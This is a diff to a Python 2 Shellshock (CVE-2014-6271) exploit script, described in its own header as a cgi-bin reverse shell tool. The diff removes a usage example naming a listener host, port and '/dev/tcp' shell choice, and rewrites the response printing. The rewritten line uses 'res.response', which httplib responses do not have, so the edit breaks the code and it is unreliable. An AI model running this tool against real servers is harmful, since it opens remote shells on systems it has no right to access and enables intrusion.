@@ -1,6 +1,5 @@
 #CVE-2014-6271 cgi-bin reverse shell
-#Pick your shell, any shell
-#example: python shellshock.py -t localhost -u /cgi/test -r localhost -p 4444 -s dev_tcp
+#
  
 import httplib
 import urllib
@@ -26,7 +25,7 @@ def main(args):
 
 	conn.request("GET",args.uri,headers=headers)
 	res=conn.getresponse()
-	print "The server responded: "+res.status+" "+res.reason
+	print res.response, res.reason
 	data = res.read()
 	print data
 if __name__ == '__main__': 
@@ -45,4 +44,3 @@ if __name__ == '__main__':
 
 	args = parser.parse_args()
 	main(args)
-
